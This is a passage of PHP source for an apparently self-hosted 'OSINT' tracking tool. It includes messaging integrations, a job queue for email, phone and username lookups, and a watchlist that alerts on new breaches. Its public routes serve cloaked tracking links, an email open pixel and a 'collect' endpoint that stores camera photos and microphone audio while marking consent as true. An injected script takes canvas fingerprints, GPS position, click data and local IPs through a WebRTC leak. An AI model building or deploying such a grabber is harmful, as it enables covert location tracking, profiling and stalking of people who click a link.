        'mailgun'=>['https://api.mailgun.net/v3/'.($m['http_mail_from'] ?: 'mg.example.com').'/messages',
                    ['Authorization: Basic '.base64_encode('api:'.$m['http_mail_key'])],
                    http_build_query(['from'=>$from,'to'=>$to,'subject'=>$subject,'text'=>$body])],
        default=>[null,[],''],
    };
    if (!$req[0]) return ['ok'=>false,'error'=>'unknown mail provider'];
    $r = http($req[0],['method'=>'POST','headers'=>$req[1],'body'=>$req[2],'timeout'=>12]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_twilio(string $to, string $body, bool $wa): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['twilio_sid'] || !$m['twilio_token']) return ['ok'=>false,'error'=>'twilio not configured'];
    $from = $wa ? $m['twilio_wa_from'] : $m['twilio_from'];
    if (!$from) return ['ok'=>false,'error'=>'no from number'];
    if ($wa && !str_starts_with($to,'whatsapp:')) $to = 'whatsapp:'.$to;
    $r = http('https://api.twilio.com/2010-04-01/Accounts/'.rawurlencode($m['twilio_sid']).'/Messages.json',[
        'method'=>'POST','timeout'=>14,
        'headers'=>['Content-Type: application/x-www-form-urlencoded','Authorization: Basic '.base64_encode($m['twilio_sid'].':'.$m['twilio_token'])],
        'body'=>http_build_query(['From'=>$from,'To'=>$to,'Body'=>$body])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_telegram(string $body, ?string $chat = null): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['telegram_token']) return ['ok'=>false,'error'=>'telegram not configured'];
    $chat = $chat ?: $m['telegram_chat'];
    if (!$chat) return ['ok'=>false,'error'=>'no chat id'];
    $r = http('https://api.telegram.org/bot'.$m['telegram_token'].'/sendMessage',['method'=>'POST','timeout'=>12,
        'headers'=>['Content-Type: application/json'],
        'body'=>json_encode(['chat_id'=>$chat,'text'=>$body,'disable_web_page_preview'=>true])]);
    $j = json_decode($r['body'],true);
    return !empty($j['ok']) ? ['ok'=>true] : ['ok'=>false,'error'=>$j['description'] ?? 'HTTP '.$r['status']];
}
function send_json_webhook(string $url, array $payload, string $secret = ''): array {
    if (!$url) return ['ok'=>false,'error'=>'no url'];
    $body = json_encode($payload + ['ts'=>gmdate('c')]);
    $hdr = ['Content-Type: application/json'];
    if ($secret) $hdr[] = 'X-Signature: '.sign_body($body,$secret);
    $r = http($url,['method'=>'POST','timeout'=>10,'follow'=>false,'headers'=>$hdr,'body'=>$body]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_ntfy(string $body, string $title = 'OSINT'): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['ntfy_topic']) return ['ok'=>false,'error'=>'ntfy not configured'];
    $hdr = ['Title: '.$title,'Content-Type: text/plain','Tags: mag'];
    if ($m['ntfy_token']) $hdr[] = 'Authorization: Bearer '.$m['ntfy_token'];
    $r = http(rtrim($m['ntfy_server'],'/').'/'.rawurlencode($m['ntfy_topic']), ['method'=>'POST','timeout'=>10,'headers'=>$hdr,'body'=>$body]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_discord(string $b): array {
    global $CFG; $u = $CFG['messaging']['discord_webhook'];
    if (!$u) return ['ok'=>false,'error'=>'discord not configured'];
    $r = http($u,['method'=>'POST','timeout'=>10,'headers'=>['Content-Type: application/json'],'body'=>json_encode(['content'=>substr($b,0,1900)])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_slack(string $b): array {
    global $CFG; $u = $CFG['messaging']['slack_webhook'];
    if (!$u) return ['ok'=>false,'error'=>'slack not configured'];
    $r = http($u,['method'=>'POST','timeout'=>10,'headers'=>['Content-Type: application/json'],'body'=>json_encode(['text'=>$b])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_gotify(string $b, string $t = 'OSINT'): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['gotify_url'] || !$m['gotify_token']) return ['ok'=>false,'error'=>'gotify not configured'];
    $r = http(rtrim($m['gotify_url'],'/').'/message?token='.urlencode($m['gotify_token']),
        ['method'=>'POST','timeout'=>10,'headers'=>['Content-Type: application/json'],'body'=>json_encode(['title'=>$t,'message'=>$b,'priority'=>5])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_pushover(string $b, string $t = 'OSINT'): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['pushover_token'] || !$m['pushover_user']) return ['ok'=>false,'error'=>'pushover not configured'];
    $r = http('https://api.pushover.net/1/messages.json',['method'=>'POST','timeout'=>10,
        'body'=>http_build_query(['token'=>$m['pushover_token'],'user'=>$m['pushover_user'],'title'=>$t,'message'=>$b])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_matrix(string $b): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['matrix_hs'] || !$m['matrix_token'] || !$m['matrix_room']) return ['ok'=>false,'error'=>'matrix not configured'];
    $url = rtrim($m['matrix_hs'],'/').'/'.urlencode('_matrix/client/r0/rooms/'.$m['matrix_room'].'/send/m.room.message/'.time());
    $r = http($url,['method'=>'PUT','timeout'=>10,'headers'=>['Authorization: Bearer '.$m['matrix_token'],'Content-Type: application/json'],
        'body'=>json_encode(['msgtype'=>'m.text','body'=>$b])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_teams(string $b): array {
    global $CFG; $u = $CFG['messaging']['teams_webhook'];
    if (!$u) return ['ok'=>false,'error'=>'teams not configured'];
    $r = http($u,['method'=>'POST','timeout'=>10,'headers'=>['Content-Type: application/json'],'body'=>json_encode(['text'=>$b])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_gchat(string $b): array {
    global $CFG; $u = $CFG['messaging']['gchat_webhook'];
    if (!$u) return ['ok'=>false,'error'=>'gchat not configured'];
    $r = http($u,['method'=>'POST','timeout'=>10,'headers'=>['Content-Type: application/json'],'body'=>json_encode(['text'=>$b])]);
    return ($r['status'] >= 200 && $r['status'] < 300) ? ['ok'=>true] : ['ok'=>false,'error'=>'HTTP '.$r['status']];
}
function send_message(string $to, string $body, array $o = []): array {
    global $CFG;
    $chain = $o['chain'] ?? $CFG['messaging']['chain'];
    $errors = [];
    foreach ($chain as $ch) {
        $subj = $o['subject'] ?? 'OSINT alert';
        $r = match ($ch) {
            'smtp'=>send_smtp($to,$body,$subj), 'http_mail'=>send_http_mail($to,$body,$subj),
            'twilio_sms'=>send_twilio($to,$body,false), 'twilio_whatsapp'=>send_twilio($to,$body,true),
            'telegram'=>send_telegram($body,$o['chat'] ?? null),
            'webhook'=>send_json_webhook($o['url'] ?? $CFG['messaging']['webhook'],['text'=>$body],$CFG['messaging']['webhook_secret']),
            'ntfy'=>send_ntfy($body,$subj), 'discord'=>send_discord($body), 'slack'=>send_slack($body),
            'gotify'=>send_gotify($body,$subj), 'pushover'=>send_pushover($body,$subj),
            'matrix'=>send_matrix($body), 'teams'=>send_teams($body), 'gchat'=>send_gchat($body),
            default=>['ok'=>false,'error'=>'unknown channel'],
        };
        try {
            db()->prepare('INSERT INTO sends (ts,channel,to_addr,body,status,response) VALUES (?,?,?,?,?,?)')
                ->execute([gmdate('Y-m-d H:i:s'),$ch,substr($to,0,190),$body,!empty($r['ok'])?'sent':'failed',substr(json_encode($r),0,400)]);
        } catch (Throwable $e) {}
        if (!empty($r['ok'])) return ['ok'=>true,'channel'=>$ch] + $r;
        $errors[$ch] = $r['error'] ?? 'failed';
    }
    return ['ok'=>false,'errors'=>$errors];
}
function alert(string $kind, string $sev, string $entity, string $msg): void {
    $pdo = db();
    $st = $pdo->prepare('SELECT id FROM alerts WHERE entity = ? AND kind = ? AND ts > ?');
    $st->execute([$entity,$kind,gmdate('Y-m-d H:i:s', time()-21600)]);
    if ($st->fetchColumn()) return;
    $pdo->prepare('INSERT INTO alerts (ts,kind,severity,subject,message,entity,sent) VALUES (?,?,?,?,?,?,0)')
        ->execute([gmdate('Y-m-d H:i:s'),$kind,$sev,$kind.': '.$entity,$msg,$entity]);
}
function fire_webhook(string $url, array $p, string $secret = ''): void { send_json_webhook($url, $p, $secret); }

/* ============================== LOGGING ============================ */
function parse_ua(string $ua): array {
    $r = ['browser'=>'Unknown','browser_ver'=>'','os'=>'Unknown','os_ver'=>'','device'=>'Unknown','dev_type'=>'desktop','is_bot'=>0];
    if ($ua === '') return $r;
    if (preg_match('/bot|crawler|spider|slurp|preview|facebookexternalhit|whatsapp|telegrambot/i',$ua)) { $r['is_bot']=1; $r['dev_type']='bot'; }
    if (preg_match('/(iphone|ipod)/i',$ua)) { $r['dev_type']='mobile'; $r['device']='iPhone'; }
    elseif (preg_match('/ipad/i',$ua)) { $r['dev_type']='tablet'; $r['device']='iPad'; }
    elseif (preg_match('/android/i',$ua)) {
        $r['dev_type'] = stripos($ua,'mobile') !== false ? 'mobile' : 'tablet';
        if (preg_match('/android[^;]*;\s*([^\)]+?)(?:\s+build|\s*\))/i',$ua,$m)) $r['device'] = trim($m[1]);
    }
    elseif (preg_match('/macintosh|mac os x/i',$ua)) $r['device'] = 'Mac';
    elseif (preg_match('/windows/i',$ua)) $r['device'] = 'PC';
    elseif (preg_match('/linux/i',$ua)) $r['device'] = 'Linux';
    foreach ([['Edg','Edge'],['OPR','Opera'],['SamsungBrowser','Samsung Internet'],['Firefox','Firefox'],
              ['CriOS','Chrome'],['Chrome','Chrome'],['Safari','Safari']] as [$sig,$name])
        if (preg_match('/'.preg_quote($sig,'/').'[\/ ]([\d.]+)/i',$ua,$m)) { $r['browser']=$name; $r['browser_ver']=$m[1]; break; }
    foreach ([['Windows NT 10','Windows','10/11'],['Windows NT 6.3','Windows','8.1'],
              ['Mac OS X (\d+[._]\d+[._]?\d*)','macOS',null],['Android[ ]?([\d.]+)','Android',null],
              ['(?:iPhone|iPad).*OS (\d+[._]\d+)','iOS',null],['Linux','Linux','']] as $p)
        if (preg_match('/'.$p[0].'/i',$ua,$m)) { $r['os']=$p[1]; $r['os_ver']=$p[2] ?? ($m[2] ?? ($m[1] ?? '')); break; }
    return $r;
}
function record(array $e): int {
    if (!flag('tracking_enabled')) return 0;
    $pdo = db();
    $ip = client_ip(); $ua = (string)($_SERVER['HTTP_USER_AGENT'] ?? ''); $p = parse_ua($ua);
    $geo = flag('collect_geo') ? geo_ip($ip) : [];
    $vid = $e['visitor_id'] ?? visitor_id();
    $lat = $e['lat'] ?? ($geo['lat'] ?? null);
    $lon = $e['lon'] ?? ($geo['lon'] ?? null);
    $address = $e['address'] ?? null;
    if (!$address && ($e['geo_src'] ?? '') === 'gps' && $lat && $lon && flag('geocode_enabled'))
        $address = fmt_address(reverse_geocode((float)$lat,(float)$lon));
    if (!$address && $geo) $address = implode(', ', array_filter([$geo['city'] ?? '',$geo['region'] ?? '',$geo['country'] ?? '']));
    $anom = detect_anomalies($vid, $lat ? (float)$lat : null, $lon ? (float)$lon : null, $geo, $p['dev_type'], $e['fp'] ?? null);

    $row = ['ts'=>gmdate('Y-m-d H:i:s'),'kind'=>$e['kind'] ?? 'hit','visitor_id'=>$vid,'session_id'=>sid(),
        'ip'=>$ip,'country'=>$e['country'] ?? ($geo['country'] ?? null),'region'=>$e['region'] ?? ($geo['region'] ?? null),
        'city'=>$e['city'] ?? ($geo['city'] ?? null),'address'=>substr((string)$address,0,400),
        'lat'=>$lat,'lon'=>$lon,'accuracy'=>$e['accuracy'] ?? null,'geo_src'=>$e['geo_src'] ?? ($geo['geo_src'] ?? null),
        'ua'=>$ua,'browser'=>$p['browser'],'browser_ver'=>$p['browser_ver'],'os'=>$p['os'],'os_ver'=>$p['os_ver'],
        'device'=>$p['device'],'dev_type'=>$p['dev_type'],'is_bot'=>$p['is_bot'],
        'is_proxy'=>!empty($geo['proxy']) ? 1 : 0,'referrer'=>$e['referrer'] ?? ($_SERVER['HTTP_REFERER'] ?? null),
        'url'=>$e['url'] ?? null,'target'=>$e['target'] ?? null,'link_id'=>$e['link_id'] ?? null,'utm'=>$e['utm'] ?? null,
        'email'=>$e['email'] ?? null,'phone'=>$e['phone'] ?? null,'phone_e164'=>$e['phone_e164'] ?? null,
        'anomaly'=>$anom ? $anom[0]['type'] : null,
        'meta'=>isset($e['meta']) ? json_encode($e['meta'] + ['anomalies'=>$anom]) : ($anom ? json_encode(['anomalies'=>$anom]) : null)];
    $cols = array_keys($row);
    $pdo->prepare('INSERT INTO events ('.implode(',',$cols).') VALUES ('.implode(',',array_map(fn($c)=>':'.$c,$cols)).')')->execute($row);
    $id = (int)$pdo->lastInsertId();

    $st = $pdo->prepare('SELECT visitor_id FROM visitors WHERE visitor_id = ?'); $st->execute([$vid]);
    if ($st->fetch())
        $pdo->prepare('UPDATE visitors SET last_seen=?, hits=hits+1, country=COALESCE(?,country), city=COALESCE(?,city), address=COALESCE(?,address) WHERE visitor_id=?')
            ->execute([$row['ts'],$row['country'],$row['city'],$row['address'],$vid]);
    else
        $pdo->prepare('INSERT INTO visitors (visitor_id,first_seen,last_seen,hits,country,city,address,browser,os,device,dev_type,fp) VALUES (?,?,?,1,?,?,?,?,?,?,?,?)')
            ->execute([$vid,$row['ts'],$row['ts'],$row['country'],$row['city'],$row['address'],$p['browser'],$p['os'],$p['device'],$p['dev_type'],$e['fp'] ?? null]);

    if (random_int(1,40) === 1) cleanup();
    return $id;
}
function capture(int $eid, string $kind, string $dataUri): void {
    if (!preg_match('~^data:(image/\w+|audio/\w+);base64,(.+)$~s',$dataUri,$m)) return;
    db()->prepare('INSERT INTO captures (event_id,kind,mime,data,bytes,ts) VALUES (?,?,?,?,?,?)')
        ->execute([$eid,$kind,$m[1],$m[2],strlen($m[2]),gmdate('Y-m-d H:i:s')]);
}
function cleanup(): void {
    $cut = gmdate('Y-m-d H:i:s', time() - setting_int('retention_days',180) * 86400);
    db()->prepare('DELETE FROM events WHERE ts < ?')->execute([$cut]);
    db()->prepare('DELETE FROM cache WHERE exp IS NOT NULL AND exp < ?')->execute([gmdate('Y-m-d H:i:s')]);
    db()->prepare('DELETE FROM ratelimit WHERE window_start < ?')->execute([gmdate('Y-m-d H:i:s', time()-7200)]);
}

/* ============================== JOBS =============================== */
function job_push(string $kind, array $payload, int $priority = 5, ?string $notify = null): int {
    db()->prepare('INSERT INTO jobs (kind,payload,status,priority,created,notify) VALUES (?,?,?,?,?,?)')
        ->execute([$kind,json_encode($payload),'queued',$priority,gmdate('Y-m-d H:i:s'),$notify]);
    return (int)db()->lastInsertId();
}
function job_worker(string $kind, array $p): array {
    return match ($kind) {
        'email'=>email_osint((string)($p['email'] ?? ''), true),
        'phone'=>phone_osint((string)($p['phone'] ?? ''), true),
        'ip'=>ip_osint((string)($p['ip'] ?? ''), true),
        'user'=>username_osint((string)($p['username'] ?? '')),
        'domain'=>domain_intel((string)($p['domain'] ?? '')),
        'subs'=>subdomains((string)($p['domain'] ?? '')),
        'tls'=>tls_info((string)($p['host'] ?? '')),
        default=>['error'=>'unknown job kind'],
    };
}
function job_run(int $max = 3): array {
    if (!flag('jobs_enabled')) return ['ok'=>false,'error'=>'jobs disabled'];
    $pdo = db();
    $rows = $pdo->query('SELECT * FROM jobs WHERE status = "queued" ORDER BY priority ASC, id ASC LIMIT '.max(1,min(20,$max)))->fetchAll();
    $out = [];
    foreach ($rows as $j) {
        $pdo->prepare('UPDATE jobs SET status="running", started=? WHERE id=?')->execute([gmdate('Y-m-d H:i:s'),$j['id']]);
        try {
            $res = job_worker($j['kind'], json_decode((string)$j['payload'],true) ?: []);
            $pdo->prepare('UPDATE jobs SET status="done", result=?, finished=? WHERE id=?')
                ->execute([json_encode($res),gmdate('Y-m-d H:i:s'),$j['id']]);
            if ($j['notify']) send_message($j['notify'], 'Job '.$j['kind'].' done');
            $out[] = ['id'=>$j['id'],'kind'=>$j['kind'],'status'=>'done'];
        } catch (Throwable $e) {
            $pdo->prepare('UPDATE jobs SET status="failed", error=?, attempts=attempts+1, finished=? WHERE id=?')
                ->execute([substr($e->getMessage(),0,400),gmdate('Y-m-d H:i:s'),$j['id']]);
            $out[] = ['id'=>$j['id'],'kind'=>$j['kind'],'status'=>'failed'];
        }
    }
    return ['ok'=>true,'processed'=>count($out),'items'=>$out];
}

/* ============================= LAZY CRON =========================== */
function lazy_cron(): void {
    if (!flag('lazy_cron')) return;
    $last = (int)cache_get('lazy_cron_last');
    if ($last && time() - $last < setting_int('lazy_cron_minutes',180) * 60) return;
    cache_set('lazy_cron_last', time(), 86400*7);
    run_cron(false);
}
function run_cron(bool $force = false): array {
    $pdo = db();
    $sum = ['checked'=>0,'changed'=>0,'alerts'=>0,'jobs'=>0];
    foreach ($pdo->query('SELECT * FROM watchlist WHERE active = 1 ORDER BY last_run IS NOT NULL, last_run LIMIT 20')->fetchAll() as $w) {
        $sum['checked']++; $changed = false;
        try {
            if ($w['kind'] === 'phone') {
                $after = phone_osint($w['value'], true);
                if (!empty($after['history']['changes'])) { $changed = true; alert('watch_phone_change','medium',$w['value'],$w['value'].' changed'); }
            } elseif ($w['kind'] === 'email') {
                $before = json_decode((string)($pdo->query('SELECT json FROM email_osint WHERE email = '.$pdo->quote($w['value']))->fetchColumn() ?: 'null'), true);
                $after = email_osint($w['value'], true);
                if (count($after['breaches']) > count($before['breaches'] ?? [])) { $changed = true; alert('watch_new_breach','high',$w['value'],$w['value'].' new breach'); }
                if (count($after['accounts']) > count($before['accounts'] ?? [])) { $changed = true; alert('watch_new_account','medium',$w['value'],$w['value'].' new accounts'); }
            } else { $after = domain_intel($w['value']); $changed = (bool)($after['registrar'] ?? null); }
        } catch (Throwable $e) { $after = ['error'=>$e->getMessage()]; }
        if ($changed) $sum['changed']++;
        $pdo->prepare('UPDATE watchlist SET last_run=?, runs=runs+1, changes=changes+?, last_hash=? WHERE id=?')
            ->execute([gmdate('Y-m-d H:i:s'), $changed ? 1 : 0, md5(json_encode($after)), $w['id']]);
    }
    if (flag('jobs_enabled')) $sum['jobs'] = job_run(5)['processed'] ?? 0;
    $to = $GLOBALS['CFG']['messaging']['alert_to'];
    foreach ($pdo->query('SELECT * FROM alerts WHERE sent = 0 ORDER BY id LIMIT 20')->fetchAll() as $a) {
        $body = '['.strtoupper($a['severity']).'] '.$a['subject']."\n".$a['message']."\n".base_url().'?t=dash&i=1';
        $res = $to ? send_message($to, $body, ['subject'=>'[OSINT] '.$a['subject']]) : ['ok'=>false];
        $pdo->prepare('UPDATE alerts SET sent=1, channel=? WHERE id=?')->execute([$res['channel'] ?? 'none', $a['id']]);
        $sum['alerts']++;
    }
    cleanup();
    return $sum;
}

/* ================================================================
 *  ROUTER
 * ================================================================ */
$t = strtolower((string)($_GET['t'] ?? 'dash'));

/* -------- public routes -------- */
if (in_array($t, ['px','open','l','link','s','collect','tel','js','beacon','form','qr','bot','v1'], true)) {
    lazy_cron();
    switch ($t) {

    case 's': case 'l': case 'link': {
        $pdo = db(); $slug = (string)($_GET['s'] ?? '');
        $st = $pdo->prepare('SELECT * FROM links WHERE slug = ?'); $st->execute([$slug]);
        if (!($link = $st->fetch())) { render_page('Not found','This link does not exist.',null); break; }
        $now = gmdate('Y-m-d H:i:s');
        if (!$link['active']) { render_page('Disabled','Switched off.',null); break; }
        if ($link['expires_at'] && $link['expires_at'] < $now) { render_page('Expired','Expired '.h($link['expires_at']).' UTC.',null); break; }
        if ($link['max_clicks'] > 0 && $link['clicks'] >= $link['max_clicks']) { render_page('Limit reached','Click cap hit.',null); break; }
        if ($link['password_hash']) {
            $ck = '_olp_'.$slug;
            if (($_COOKIE[$ck] ?? '') !== substr(hash('sha256',$link['password_hash']),0,16)) {
                if ($_SERVER['REQUEST_METHOD'] === 'POST' && password_verify((string)($_POST['pw'] ?? ''), $link['password_hash'])) {
                    setcookie($ck, substr(hash('sha256',$link['password_hash']),0,16), ['expires'=>time()+86400,'path'=>'/','httponly'=>true]);
                    header('Location: '.url_for(['t'=>'l','s'=>$slug])); break;
                }
                render_password($link,$slug); break;
            }
        }
        record(['kind'=>'link_view','link_id'=>$link['id'],'target'=>$link['destination'],'meta'=>['slug'=>$slug]]);

        $dest = $link['destination'];
        $geo = geo_ip(client_ip());
        foreach (json_decode((string)$link['rules'], true) ?: [] as $rule) {
            $m = $rule['match'] ?? []; $hit = true;
            if (!empty($m['country']) && !in_array($geo['country_code'] ?? '', $m['country'], true)) $hit = false;
            if (!empty($m['device']) && $m['device'] !== parse_ua((string)($_SERVER['HTTP_USER_AGENT'] ?? ''))['dev_type']) $hit = false;
            if (!empty($m['ref']) && stripos((string)($_SERVER['HTTP_REFERER'] ?? ''), (string)$m['ref']) === false) $hit = false;
            if ($hit && !empty($rule['then']['dest'])) { $dest = $rule['then']['dest']; break; }
        }
        $splits = json_decode((string)$link['splits'], true) ?: [];
        if ($splits) {
            $tot = array_sum(array_column($splits,'weight')) ?: 1;
            $r = random_int(1,(int)$tot); $acc = 0;
            foreach ($splits as $sp) { $acc += (int)($sp['weight'] ?? 1); if ($r <= $acc) { $dest = $sp['dest']; break; } }
        }
        if ($link['utm']) {
            $u = json_decode((string)$link['utm'], true) ?: [];
            if ($u) $dest .= (str_contains($dest,'?') ? '&' : '?') . http_build_query(array_filter($u));
        }
        if ($link['require_consent'] && flag('consent_required')) { render_consent($link,$slug,$dest); break; }
        $pdo->prepare('UPDATE links SET clicks = clicks + 1 WHERE id = ?')->execute([$link['id']]);
        record(['kind'=>'link_click','link_id'=>$link['id'],'target'=>$dest,'meta'=>['slug'=>$slug]]);
        if ($link['webhook']) fire_webhook($link['webhook'], ['event'=>'click','slug'=>$slug,'ip'=>client_ip()], (string)$link['webhook_secret']);
        if ($link['cloak']) { render_cloak($dest, $link); break; }
        header('Cache-Control: no-store'); header('Location: '.$dest, true, 302); break;
    }

    case 'collect': {
        header('Access-Control-Allow-Origin: *'); header('Access-Control-Allow-Headers: Content-Type');
        $b = json_decode((string)file_get_contents('php://input'), true) ?: $_POST;
        $slug = (string)($b['slug'] ?? '');
        $st = db()->prepare('SELECT * FROM links WHERE slug = ?'); $st->execute([$slug]);
        if (!($link = $st->fetch())) { jout(['ok'=>false,'error'=>'unknown slug'],404); break; }
        $meta = $b; foreach (['slug','photo','audio','url','ref','lat','lon','acc','geo_src'] as $k) unset($meta[$k]);
        $eid = record(['kind'=>'link_click','link_id'=>$link['id'],'target'=>$link['destination'],
            'lat'=>isset($b['lat']) ? (float)$b['lat'] : null,'lon'=>isset($b['lon']) ? (float)$b['lon'] : null,
            'accuracy'=>isset($b['acc']) ? (float)$b['acc'] : null,'geo_src'=>$b['geo_src'] ?? null,
            'url'=>$b['url'] ?? null,'referrer'=>$b['ref'] ?? null,'fp'=>$meta['fp'] ?? null,
            'meta'=>$meta + ['slug'=>$slug,'consent'=>true]]);
        if (!empty($b['photo'])) capture($eid,'camera',(string)$b['photo']);
        if (!empty($b['mic_audio'])) capture($eid,'audio',(string)$b['mic_audio']);
        db()->prepare('UPDATE links SET clicks = clicks + 1 WHERE id = ?')->execute([$link['id']]);
        if ($link['webhook']) fire_webhook($link['webhook'], ['event'=>'click','slug'=>$slug,'ip'=>client_ip()], (string)$link['webhook_secret']);
        jout(['ok'=>true,'redirect'=>$link['destination'],'event'=>$eid]); break;
    }

    case 'px': case 'open': {
        $slug = (string)($_GET['e'] ?? $_GET['s'] ?? ''); $rec = null;
        if ($slug !== '') {
            $st = db()->prepare('SELECT recipient FROM emails WHERE slug = ?'); $st->execute([$slug]);
            if (($rec = $st->fetchColumn()) !== false)
                db()->prepare('UPDATE emails SET opens=opens+1,last_open=?,first_open=COALESCE(first_open,?) WHERE slug=?')
                    ->execute([gmdate('Y-m-d H:i:s'),gmdate('Y-m-d H:i:s'),$slug]);
        }
        record(['kind'=>'email_open','email'=>$rec ?: $slug,'meta'=>['slug'=>$slug]]); emit_gif(); break;
    }

    case 'tel': {
        $raw = (string)($_GET['n'] ?? ''); $e164 = phone_normalize($raw) ?? $raw;
        record(['kind'=>'phone_tap','phone'=>$raw,'phone_e164'=>$e164]);
        header('Cache-Control: no-store'); header('Location: tel:'.$e164, true, 302); break;
    }

    case 'qr': {
        $data = (string)($_GET['d'] ?? base_url());
        $size = max(80, min(1000, (int)($_GET['size'] ?? 300)));
        $png = qr_png($data, $size);
        if (!$png) { http_response_code(502); exit('qr unavailable'); }
        header('Content-Type: image/png'); header('Cache-Control: max-age=2592000'); echo $png; break;
    }

    case 'js': {
        $base = base_url(); $vid = visitor_id();
        header('Content-Type: application/javascript; charset=utf-8'); header('Cache-Control: max-age=300');
        ?>
(function(){var B=<?= json_encode($base) ?>,V=<?= json_encode($vid) ?>,t0=Date.now(),ms=0,done=false;
 function hash(s){var h=5381;for(var i=0;i<s.length;i++)h=((h<<5)+h+s.charCodeAt(i))>>>0;return h.toString(16);}
 function fp(){try{var c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';
  x.fillStyle='#f60';x.fillRect(0,0,80,20);x.fillStyle='#069';x.fillText('o',2,2);
  return hash(c.toDataURL()+navigator.language+navigator.platform+screen.width+navigator.hardwareConcurrency);}catch(e){return null;}}
 function base(){return{ref:document.referrer||null,url:location.href,screen:screen.width+'x'+screen.height+'@'+screen.colorDepth,
  vp:innerWidth+'x'+innerHeight,tz:(Intl.DateTimeFormat().resolvedOptions().timeZone||null),lang:navigator.language,
  cores:navigator.hardwareConcurrency||null,mem:navigator.deviceMemory||null,touch:('ontouchstart' in window)?1:0,
  conn:(navigator.connection&&navigator.connection.effectiveType)||null,fp:fp(),ua:navigator.userAgent,
  dev_type:/Mobi|Android/i.test(navigator.userAgent)?'mobile':(/Tablet|iPad/i.test(navigator.userAgent)?'tablet':'desktop')};}
 function send(p){var b=JSON.stringify(p),u=B+'?t=beacon&v='+V+'&i=1';
  if(navigator.sendBeacon)navigator.sendBeacon(u,new Blob([b],{type:'application/json'}));
  else{var x=new XMLHttpRequest();x.open('POST',u,true);x.setRequestHeader('Content-Type','application/json');x.send(b);}}
 window.osintTrack=function(n,d){var p=base();p.kind=n||'custom';p.meta=d||{};send(p);};
 if(<?= flag('collect_heatmap') ? 'true' : 'false' ?>){
  addEventListener('click',function(e){send({kind:'click',url:location.href,x:e.clientX,y:e.clientY,
   vw:innerWidth,vh:innerHeight,scroll:Math.round(scrollY),
   sel:(e.target&&e.target.tagName||'')+(e.target&&e.target.id?'#'+e.target.id:''),
   tag:(e.target&&e.target.tagName)||null,text:(e.target&&e.target.innerText||'').slice(0,80)});},true);}
 addEventListener('scroll',function(){var h=document.documentElement.scrollHeight-innerHeight;
  if(h>0)ms=Math.max(ms,Math.round(scrollY/h*100));},{passive:true});
 function fin(){if(done)return;done=true;var p=base();p.kind='page_leave';p.meta={dwell_ms:Date.now()-t0,scroll_pct:ms};send(p);}
 addEventListener('pagehide',fin);document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')fin();});
 if(<?= flag('collect_webrtc') ? 'true' : 'false' ?>){
  try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});var ips=[];
   pc.createDataChannel('x');pc.onicecandidate=function(e){if(!e.candidate)return;
    var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);if(m&&ips.indexOf(m[1])<0){ips.push(m[1]);
     var p=base();p.kind='webrtc';p.meta={local_ips:ips};send(p);}};
   pc.createOffer().then(function(o){pc.setLocalDescription(o);});setTimeout(function(){try{pc.close();}catch(e){}},4000);}catch(e){}}
 if(navigator.geolocation)navigator.geolocation.getCurrentPosition(
  function(g){var p=base();p.lat=g.coords.latitude;p.lon=g.coords.longitude;p.acc=g.coords.accuracy;p.geo_src='gps';send(p);},
  function(){var p=base();p.geo_src='gps_denied';send(p);},{timeout:8000,maximumAge:600000});
 else send(base());})();
        <?php break;
    }

    case 'beacon': {
        header('Access-Control-Allow-Origin: *'); header('Access-Control-Allow-Headers: Content-Type');
        $d = json_decode((string)file_get_contents('php://input'), true) ?: $_POST;
        $vid = $_GET['v'] ?? null;
        if (!is_string($vid) || !preg_match('/^[a-f0-9]{32}$/',$vid)) $vid = null;
        $kind = preg_replace('/[^a-z0-9_]/i','',(string)($d['kind'] ?? 'client'));
        if ($kind === 'click') {
            db()->prepare('INSERT INTO clicks (ts,visitor_id,session_id,path,x,y,vw,vh,scroll,sel,tag,text) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)')
                ->execute([gmdate('Y-m-d H:i:s'),$vid,sid(),(string)($d['url'] ?? ''),(int)($d['x'] ?? 0),(int)($d['y'] ?? 0),
                    (int)($d['vw'] ?? 0),(int)($d['vh'] ?? 0),(int)($d['scroll'] ?? 0),
                    substr((string)($d['sel'] ?? ''),0,190),substr((string)($d['tag'] ?? ''),0,32),substr((string)($d['text'] ?? ''),0,190)]);
            jout(['ok'=>true]); break;
        }
        $meta = $d; foreach (['kind','ref','url','lat','lon','acc','geo_src'] as $k) unset($meta[$k]);
        record(['kind'=>in_array($kind,['page_leave','custom','webrtc','native_gps'],true) ? $kind : 'client','visitor_id'=>$vid,
            'url'=>$d['url'] ?? null,'referrer'=>$d['ref'] ?? null,
